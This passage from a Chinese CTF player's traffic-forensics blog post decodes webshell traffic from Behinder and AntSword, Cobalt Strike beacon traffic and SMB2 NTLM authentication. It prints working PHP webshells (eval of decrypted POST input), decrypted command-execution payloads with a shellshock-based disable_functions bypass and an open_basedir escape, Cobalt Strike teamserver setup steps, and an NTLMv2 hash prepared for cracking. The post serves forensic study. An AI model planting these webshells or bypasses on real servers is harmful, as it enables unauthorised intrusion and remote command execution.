for($i=0;$i\u0026lt;strlen($after);$i++) { $after[$i] = $after[$i]^$key[$i+1\u0026amp;15]; } return $after; } webshell：\n\u0026lt;?php @error_reporting(0); function Decrypt($data) { $key=\u0026#34;e45e329feb5d925b\u0026#34;; $bs=\u0026#34;base64_\u0026#34;.\u0026#34;decode\u0026#34;; $after=$bs($data.\u0026#34;\u0026#34;); for($i=0;$i\u0026lt;strlen($after);$i++) { $after[$i] = $after[$i]^$key[$i+1\u0026amp;15]; } return $after; } $post=Decrypt(file_get_contents(\u0026#34;php://input\u0026#34;)); @eval($post); ?\u0026gt; 流量包：\n请求部分进行 base64 + xor 解密获取执行的命令：\n@error_reporting(0); function getSafeStr($str){ $s1 = iconv(\u0026#39;utf-8\u0026#39;,\u0026#39;gbk//IGNORE\u0026#39;,$str); $s0 = iconv(\u0026#39;gbk\u0026#39;,\u0026#39;utf-8//IGNORE\u0026#39;,$s1); if($s0 == $str){ return $s0; }else{ return iconv(\u0026#39;gbk\u0026#39;,\u0026#39;utf-8//IGNORE\u0026#39;,$str); } } function main($cmd,$path) { @set_time_limit(0); @ignore_user_abort(1); @ini_set(\u0026#39;max_execution_time\u0026#39;, 0); $result = array(); $PadtJn = @ini_get(\u0026#39;disable_functions\u0026#39;); if (! empty($PadtJn)) { $PadtJn = preg_replace(\u0026#39;/[, ]+/\u0026#39;, \u0026#39;,\u0026#39;, $PadtJn); $PadtJn = explode(\u0026#39;,\u0026#39;, $PadtJn); $PadtJn = array_map(\u0026#39;trim\u0026#39;, $PadtJn); } else { $PadtJn = array(); } $c = $cmd; if (FALSE !== strpos(strtolower(PHP_OS), \u0026#39;win\u0026#39;)) { $c = $c . \u0026#34; 2\u0026gt;\u0026amp;1\\n\u0026#34;; } $JueQDBH = \u0026#39;is_callable\u0026#39;; $Bvce = \u0026#39;in_array\u0026#39;; if ($JueQDBH(\u0026#39;system\u0026#39;) and ! $Bvce(\u0026#39;system\u0026#39;, $PadtJn)) { ob_start(); system($c); $kWJW = ob_get_contents(); ob_end_clean(); } else if ($JueQDBH(\u0026#39;proc_open\u0026#39;) and ! $Bvce(\u0026#39;proc_open\u0026#39;, $PadtJn)) { $handle = proc_open($c, array( array( \u0026#39;pipe\u0026#39;, \u0026#39;r\u0026#39; ), array( \u0026#39;pipe\u0026#39;, \u0026#39;w\u0026#39; ), array( \u0026#39;pipe\u0026#39;, \u0026#39;w\u0026#39; ) ), $pipes); $kWJW = NULL; while (! feof($pipes[1])) { $kWJW .= fread($pipes[1], 1024); } @proc_close($handle); } else if ($JueQDBH(\u0026#39;passthru\u0026#39;) and ! $Bvce(\u0026#39;passthru\u0026#39;, $PadtJn)) { ob_start(); passthru($c); $kWJW = ob_get_contents(); ob_end_clean(); } else if ($JueQDBH(\u0026#39;shell_exec\u0026#39;) and ! $Bvce(\u0026#39;shell_exec\u0026#39;, $PadtJn)) { $kWJW = shell_exec($c); } else if ($JueQDBH(\u0026#39;exec\u0026#39;) and ! $Bvce(\u0026#39;exec\u0026#39;, $PadtJn)) { $kWJW = array(); exec($c, $kWJW); $kWJW = join(chr(10), $kWJW) . chr(10); } else if ($JueQDBH(\u0026#39;exec\u0026#39;) and ! $Bvce(\u0026#39;popen\u0026#39;, $PadtJn)) { $fp = popen($c, \u0026#39;r\u0026#39;); $kWJW = NULL; if (is_resource($fp)) { while (! feof($fp)) { $kWJW .= fread($fp, 1024); } } @pclose($fp); } else { $kWJW = 0; $result[\u0026#34;status\u0026#34;] = base64_encode(\u0026#34;fail\u0026#34;); $result[\u0026#34;msg\u0026#34;] = base64_encode(\u0026#34;none of proc_open/passthru/shell_exec/exec/exec is available\u0026#34;); $key = $_SESSION[\u0026#39;k\u0026#39;]; echo encrypt(json_encode($result)); return; } $result[\u0026#34;status\u0026#34;] = base64_encode(\u0026#34;success\u0026#34;); $result[\u0026#34;msg\u0026#34;] = base64_encode(getSafeStr($kWJW)); echo encrypt(json_encode($result)); } function Encrypt($data) { $key=\u0026#34;e45e329feb5d925b\u0026#34;; for($i=0;$i\u0026lt;strlen($data);$i++) { $data[$i] = $data[$i]^$key[$i+1\u0026amp;15]; } $bs=\u0026#34;base64_\u0026#34;.\u0026#34;encode\u0026#34;; $after=$bs($data.\u0026#34;\u0026#34;); return $after; } $cmd=\u0026#34;Y2QgL2QgIkQ6XEFBQUNURlxXRUJccGhwU3R1ZHlfNjRccGhwc3R1ZHlfcHJvXFdXV1x0ZXN0XCImd2hvYW1p\u0026#34;;$cmd=base64_decode($cmd);$path=\u0026#34;RDovQUFBQ1RGL1dFQi9waHBTdHVkeV82NC9waHBzdHVkeV9wcm8vV1dXL3Rlc3Qv\u0026#34;;$path=base64_decode($path); main($cmd,$path); 可以看出执行的命令就是$cmd，命令执行目录为$path，返回的响应包中是一个encrypt过的json，里面有两条信息 $status 和 $msg，都是base64编码过的，其中$msg为执行结果：\naes_with_magic Encrypt：\nfunction Encrypt($data) { $key=\u0026#34;e45e329feb5d925b\u0026#34;; $encrypted=base64_encode(openssl_encrypt($data, \u0026#34;AES-128-ECB\u0026#34;, $key,OPENSSL_PKCS1_PADDING)); $magicNum=hexdec(substr($key,0,2))%16; for($i=0;$i\u0026lt;$magicNum;$i++) { $encrypted=$encrypted.chr(mt_rand(0, 255)); } return $encrypted; } Decrypt：\nfunction Decrypt($data) { $key=\u0026#34;e45e329feb5d925b\u0026#34;; $magicNum=hexdec(substr($key,0,2))%16; $data=substr($data,0,strlen($data)-$magicNum); return openssl_decrypt(base64_decode($data), \u0026#34;AES-128-ECB\u0026#34;, $key,OPENSSL_PKCS1_PADDING); } webshell：\n\u0026lt;?php @error_reporting(0); function Decrypt($data) { $key=\u0026#34;e45e329feb5d925b\u0026#34;; $magicNum=hexdec(substr($key,0,2))%16; $data=substr($data,0,strlen($data)-$magicNum); return openssl_decrypt(base64_decode($data), \u0026#34;AES-128-ECB\u0026#34;, $key,OPENSSL_PKCS1_PADDING); } $post=Decrypt(file_get_contents(\u0026#34;php://input\u0026#34;)); @eval($post); ?\u0026gt; aes_with_magic 会在尾部添加几个随机字符用于干扰，长度根据 $magicNum 而定，比如本例中为4，又因为没有传入IV，所以解密时初始向量为 \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\n流量包，请求包尾部有4个额外字符：\n解密出执行内容以后，后续解密执行命令和执行结果都与之前没有区别：\ndefault_aes webshell：\n\u0026lt;?php @error_reporting(0); function Decrypt($data) { $key=\u0026#34;e45e329feb5d925b\u0026#34;; //该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond return openssl_decrypt(base64_decode($data), \u0026#34;AES-128-ECB\u0026#34;, $key,OPENSSL_PKCS1_PADDING); } $post=Decrypt(file_get_contents(\u0026#34;php://input\u0026#34;)); @eval($post); ?\u0026gt; 和aes_with_magic的唯一区别是没有干扰字符，直接就可以拿请求包的数据进行解密\n中国蚁剑 https://github.com/AntSwordProject/antSword\n蚁剑能配置自定义编码器：\n这里用蚁剑自带的进行分析\nwebshell：\n\u0026lt;?php @eval($_REQUEST[1]); ?\u0026gt; 流量包：\nURL Decode一下传入的参数：\n1=@ini_set(\u0026#34;display_errors\u0026#34;, \u0026#34;0\u0026#34;);@set_time_limit(0);$opdir=@ini_get(\u0026#34;open_basedir\u0026#34;);if($opdir) {$ocwd=dirname($_SERVER[\u0026#34;SCRIPT_FILENAME\u0026#34;]);$oparr=preg_split(base64_decode(\u0026#34;Lzt8Oi8=\u0026#34;),$opdir);@array_push($oparr,$ocwd,sys_get_temp_dir());foreach($oparr as $item) {if(!@is_writable($item)){continue;};$tmdir=$item.\u0026#34;/.6c8e53\u0026#34;;@mkdir($tmdir);if(!@file_exists($tmdir)){continue;}$tmdir=realpath($tmdir);@chdir($tmdir);@ini_set(\u0026#34;open_basedir\u0026#34;, \u0026#34;..\u0026#34;);$cntarr=@preg_split(\u0026#34;/\\\\\\\\|\\//\u0026#34;,$tmdir);for($i=0;$i\u0026lt;sizeof($cntarr);$i++){@chdir(\u0026#34;..\u0026#34;);};@ini_set(\u0026#34;open_basedir\u0026#34;,\u0026#34;/\u0026#34;);@rmdir($tmdir);break;};};;function asenc($out){return $out;};function asoutput(){$output=ob_get_contents();ob_end_clean();echo \u0026#34;e41\u0026#34;.\u0026#34;be6d\u0026#34;;echo @asenc($output);echo \u0026#34;d8c66d\u0026#34;.\u0026#34;0bb0fb\u0026#34;;}ob_start();try{$p=base64_decode(substr($_POST[\u0026#34;beb61c5242a79d\u0026#34;],2));$s=base64_decode(substr($_POST[\u0026#34;t785fa3d878e6e\u0026#34;],2));$envstr=@base64_decode(substr($_POST[\u0026#34;g64b1274b158be\u0026#34;],2));$d=dirname($_SERVER[\u0026#34;SCRIPT_FILENAME\u0026#34;]);$c=substr($d,0,1)==\u0026#34;/\u0026#34;?\u0026#34;-c \\\u0026#34;{$s}\\\u0026#34;\u0026#34;:\u0026#34;/c \\\u0026#34;{$s}\\\u0026#34;\u0026#34;;if(substr($d,0,1)==\u0026#34;/\u0026#34;){@putenv(\u0026#34;PATH=\u0026#34;.getenv(\u0026#34;PATH\u0026#34;).\u0026#34;:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\u0026#34;);}else{@putenv(\u0026#34;PATH=\u0026#34;.getenv(\u0026#34;PATH\u0026#34;).\u0026#34;;C:/Windows/system32;C:/Windows/SysWOW64;C:/Windows;C:/Windows/System32/WindowsPowerShell/v1.0/;\u0026#34;);}if(!empty($envstr)){$envarr=explode(\u0026#34;|||asline|||\u0026#34;, $envstr);foreach($envarr as $v) {if (!empty($v)) {@putenv(str_replace(\u0026#34;|||askey|||\u0026#34;, \u0026#34;=\u0026#34;, $v));}}}$r=\u0026#34;{$p} {$c}\u0026#34;;function fe($f){$d=explode(\u0026#34;,\u0026#34;,@ini_get(\u0026#34;disable_functions\u0026#34;));if(empty($d)){$d=array();}else{$d=array_map(\u0026#39;trim\u0026#39;,array_map(\u0026#39;strtolower\u0026#39;,$d));}return(function_exists($f)\u0026amp;\u0026amp;is_callable($f)\u0026amp;\u0026amp;!in_array($f,$d));};function runshellshock($d, $c) {if (substr($d, 0, 1) == \u0026#34;/\u0026#34; \u0026amp;\u0026amp; fe(\u0026#39;putenv\u0026#39;) \u0026amp;\u0026amp; (fe(\u0026#39;error_log\u0026#39;) || fe(\u0026#39;mail\u0026#39;))) {if (strstr(readlink(\u0026#34;/bin/sh\u0026#34;), \u0026#34;bash\u0026#34;) != FALSE) {$tmp = tempnam(sys_get_temp_dir(), \u0026#39;as\u0026#39;);putenv(\u0026#34;PHP_LOL=() { x; }; $c \u0026gt;$tmp 2\u0026gt;\u0026amp;1\u0026#34;);if (fe(\u0026#39;error_log\u0026#39;)) {error_log(\u0026#34;a\u0026#34;, 1);} else {mail(\u0026#34;a@127.0.0.1\u0026#34;, \u0026#34;\u0026#34;, \u0026#34;\u0026#34;, \u0026#34;-bv\u0026#34;);}} else {return False;}$output = @file_get_contents($tmp);@unlink($tmp);if ($output != \u0026#34;\u0026#34;) {print($output);return True;}}return False;};function runcmd($c){$ret=0;$d=dirname($_SERVER[\u0026#34;SCRIPT_FILENAME\u0026#34;]);if(fe(\u0026#39;system\u0026#39;)){@system($c,$ret);}elseif(fe(\u0026#39;passthru\u0026#39;)){@passthru($c,$ret);}elseif(fe(\u0026#39;shell_exec\u0026#39;)){print(@shell_exec($c));}elseif(fe(\u0026#39;exec\u0026#39;)){@exec($c,$o,$ret);print(join(\u0026#34; \u0026#34;,$o));}elseif(fe(\u0026#39;popen\u0026#39;)){$fp=@popen($c,\u0026#39;r\u0026#39;);while(!@feof($fp)){print(@fgets($fp,2048));}@pclose($fp);}elseif(fe(\u0026#39;proc_open\u0026#39;)){$p = @proc_open($c, array(1 =\u0026gt; array(\u0026#39;pipe\u0026#39;, \u0026#39;w\u0026#39;), 2 =\u0026gt; array(\u0026#39;pipe\u0026#39;, \u0026#39;w\u0026#39;)), $io);while(!@feof($io[1])){print(@fgets($io[1],2048));}while(!@feof($io[2])){print(@fgets($io[2],2048));}@fclose($io[1]);@fclose($io[2]);@proc_close($p);}elseif(fe(\u0026#39;antsystem\u0026#39;)){@antsystem($c);}elseif(runshellshock($d, $c)) {return $ret;}elseif(substr($d,0,1)!=\u0026#34;/\u0026#34; \u0026amp;\u0026amp; @class_exists(\u0026#34;COM\u0026#34;)){$w=new COM(\u0026#39;WScript.shell\u0026#39;);$e=$w-\u0026gt;exec($c);$so=$e-\u0026gt;StdOut();$ret.=$so-\u0026gt;ReadAll();$se=$e-\u0026gt;StdErr();$ret.=$se-\u0026gt;ReadAll();print($ret);}else{$ret = 127;}return $ret;};$ret=@runcmd($r.\u0026#34; 2\u0026gt;\u0026amp;1\u0026#34;);print ($ret!=0)?\u0026#34;ret={$ret}\u0026#34;:\u0026#34;\u0026#34;;;}catch(Exception $e){echo \u0026#34;ERROR://\u0026#34;.$e-\u0026gt;getMessage();};asoutput();die();\u0026amp;beb61c5242a79d=UwY21k\u0026amp;g64b1274b158be=ne\u0026amp;t785fa3d878e6e=2fY2QgL2QgIkQ6L0FBQUNURi9XRUIvcGhwU3R1ZHlfNjQvcGhwc3R1ZHlfcHJvL1dXVy90ZXN0IiZ3aG9hbWkmZWNobyA1ZTYzMTFkMDQmY2QmZWNobyBmZGFjNzgyNTQx 分析一下可以知道：\n$p=base64_decode(substr($_POST[\u0026#34;beb61c5242a79d\u0026#34;],2)); // 程序路径 $s=base64_decode(substr($_POST[\u0026#34;t785fa3d878e6e\u0026#34;],2)); // 实际命令 $envstr=@base64_decode(substr($_POST[\u0026#34;g64b1274b158be\u0026#34;],2)); // 环境变量 蚁剑比较特殊的是会在参数值前加上2个干扰字符，所以就有了 substr 从第三个字符开始进行解码，并且在输出内容的前后加上特定的十六进制字符串 e41be6d 和 d8c66d0bb0fb，这也是蚁剑的特征：\nCobalt Strike流量 分析版本：Cobalt Strike 4.0\nC/S架构：\ncs分为客户端和服务器端，使用cs时必须要启用TeamServer服务器，需要有可执行权限，TeamServer功能：\n控制 - Team Server是Cobalt Strike中所有payload的主控制器，与victim的所有连接 bind/reverse 都由Team Server管理。\r日志记录 - Cobalt Strike中发生的所有事件 保存在logs文件夹\r信息搜集 - 收集在后渗透阶段发现的、或攻击者在目标系统上用于登录的所有凭据credentials\r自定义脚本 - cat teamserver可看到该文件是一个简单的bash脚本(可根据自己要求修改) 调用Metasploit RPC服务msfrpcd并启动服务器cobaltstrike.jar cs使用基本流程：\n1.启动TeamServer\r2.Client登录TeamServer 启动TeamServer，默认端口50050，可以通过编辑teamserver文件修改：\n$ sudo ./teamserver [*] Will use existing X509 certificate and keystore (for SSL) [*] ./teamserver \u0026lt;host\u0026gt; \u0026lt;password\u0026gt; [/path/to/c2.profile] [YYYY-MM-DD] \u0026lt;host\u0026gt; is the (default) IP address of this Cobalt Strike team server \u0026lt;password\u0026gt; is the shared password to connect to this server [/path/to/c2.profile] is your Malleable C2 profile [YYYY-MM-DD] is a kill date for Beacon payloads run from this server \u0026lt;host\u0026gt;：必填，服务器公网ip或域名\r\u0026lt;password\u0026gt;：必填，客户端Client GUI连接服务器TeamServer的密码\r[/path/to/c2.profile]：选填，指定C2通信配置文件\r[YYYY-MM-DD]：所有payload的终止日期 Client登录TeamServer，启动cobaltstrike.jar：\njava -XX:ParallelGCThreads=4 -XX:+AggressiveHeap -XX:+UseParallelGC -jar cobaltstrike.jar 需要填写一些基本信息：\n可通过Cobalt Strike - \u0026gt; Preferences - \u0026gt; Team Servers维护本地的登录信息配置文件的列表team server profiles\n登陆成功后就能看到GUI界面\nCobalt Strike - \u0026gt; Preferences - \u0026gt; Listeners，cs4.0 一共8种listener：\nhttp-beacon 配置listener：\n生成windows可执行程序，staged对应artifact.exe，stageless对应beacon.exe，有明显的大小区别并且stageless没有stage下载的步骤：\n以artifact.exe为例进行流量抓取和分析：\n靶机运行stager后会自动进行stage下载，stager对应的请求路径并非真实存在，比如 /WCTo，但是满足一定要求 (checksum8)，路径的 ascii 之和与 256 取余计算值得到结果，32位后门结果为92，64位后门结果为93，这样stager就知道要返回stage：\n可以用 metatool 来检验一下:\n用 1768.py 来分析 stage，如果存在已知私钥会在publickey之后显示 Has Known private key，本例并不存在已知私钥：\nstage 被加载和执行后的运行状态也就是最终的恶意程序Beacon，Beacon 与 C2 服务器之间的加密机制采用混合加密模式，以确保通信的机密性和效率：\n公钥交换与会话建立 (元数据加密): 在 Beacon 首次连接（或心跳回连）时，它会使用内置的 C2 公钥 (RSA) 来加密一个随机生成的会话密钥 (Session Key) 和初始元数据\r私钥解密: Team Server 收到该数据后，使用其对应的 私钥 (RSA) 将其解密，从而安全地获得这个一次性的会话密钥\r对称加密 (后续通信): 一旦会话密钥建立，Beacon 与 C2 之间的后续所有命令、执行结果和数据传输，都将使用这个会话密钥进行 AES 对称加密 可以根据 1768.py 脚本执行结果对cs流量进行初步分析：\n0x0001 payload type 0x0001 0x0002 0 windows-beacon_http-reverse_http\r0x0002 port 0x0001 0x0002 80\r0x0003 sleeptime 0x0002 0x0004 60000\r0x0007 publickey 0x0003 0x0100 30819f300d06092a864886f70d010101050003818d0030818902818100ad0a7e620a2f982cecd21f35961a7d02002ff6e04c5ca148398c8bfb4beadc72b337efe5b7fe0219fb54f9a17d70fd3d20e3c62b53e96813a0b077045cd4b7ef9e743450a85ba8d25bb65500c00bcdcd00594d54d0da24829827cbb5a64248e082165c024ddbb31e117a69a49893d3006e8b3b74f8c8a577b96ad2b9f8af04cf020301000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\r0x0008 server,get-uri 0x0003 0x0100 \u0026#39;192.168.50.128,/IE9CompatViewList.xml\u0026#39;\r0x000a post-uri 0x0003 0x0040 \u0026#39;/submit.php\u0026#39; payload类型即监听器类型，心跳包间隔时间，回连ip/端口，get/post请求路径这些关键信息都有，方便后续从流量里定位重要信息\n先来看GET的流量包：\nC2 Profile 决定了元数据编码的位置，本例中利用 Cookie 携带信息 (Metadata) 传递给C2服务器，可以用 cs-decrypt-metadata.py 来解密元数据，但是需要用到私钥，如果是题目可能会给出私钥文件 .cobaltstrike.beacon_keys，这时可以用 parse_beacon_keys.py 来解析出公私钥：\n将私钥变成hex形式：\n再用 cs-decrypt-metadata.py 解出 rawkey, aeskey 和 hmackey，可以看到还有靶机ip 用户名等信息：\n最后就可以用 cs-parse-http-traffic.py 来解密整段cs流量，需要提供原始密钥 rawkey：\n从第478个包开始响应中包含需要执行的命令，但是直接过滤器配置 frame.number \u0026gt;= 278 即可，避免遗漏命令，可以发现我抓取的整段cs流量最终在靶机上只执行了一个命令 whoami\ncs流量分析利用到的工具：\nhttps://github.com/DidierStevens/DidierStevensSuite/blob/master/1768.py\nhttps://github.com/DidierStevens/Beta/blob/master/metatool.py\nhttps://github.com/DidierStevens/DidierStevensSuite/blob/master/cs-decrypt-metadata.py\nhttps://github.com/Slzdude/cs-scripts/blob/master/parse_beacon_keys.py\nhttps://github.com/DidierStevens/Beta/blob/master/cs-parse-http-traffic.py\nSMB2 解密SMB2流量需要构造哈希进行爆破获取密码，格式：username::domain:ServerChallenge:NTproofstring:modifiedntlmv2response\n过滤器设置ntlmssp来获取认证握手，NTLMSSP_AUTH包中Security Blob层：\n再过滤ntlmssp.ntlmserverchallenge：\n构造出完整哈希，注意流量里的ntlmv2response开头为NTproofstring，需要删除：\nroot::.:924ca077500cd533:e43ae3e491ffe96bca5383b9c0bc4946:0101000000000000b6ca87356b64dc01eca054741fa479e600000000020008004b0041004c004900010008004b0041004c00490004000000030008006b0061006c00690007000800b6ca87356b64dc0106000400020000000800300030000000000000000100000000200000e5528e00f4d9b3bf475abbb1d4e90ac0163587fccd7d2e8aafdb9b455327e48d0a001000000000000000000000000000000000000900260063006900660073002f003100390032002e003100360038002e00350030002e003100320038000000000000000000 也可以直接通过NTLMv2 hash抓取工具NTLMRawUnHide来直接获取哈希：\nhashcat爆破密码：\n如果要查看通过SMB传输的文件，在wireshark中导出SMB对象即可：\n参考资料：\nhttps://goodlunatic.github.io/posts/5422d65/\nhttps://www.ddosi.org/cobaltstrike/\nhttps://xz.aliyun.com/news/3607\nhttps://www.ddosi.org/cs-decrypt-1/\nhttps://www.ddosi.org/cs-decrypt-2/\nhttps://www.secpulse.com/archives/106276.html\n","permalink":"https://blog.w8nn9z.top/posts/forensics/llfx/","summary":"","title":"流量分析"},{"content":"Third-year student at NJUPT\nCTF player of X1cT34m \u0026amp; NepNep\n","permalink":"https://blog.w8nn9z.top/about/","summary":"about","title":"About"}]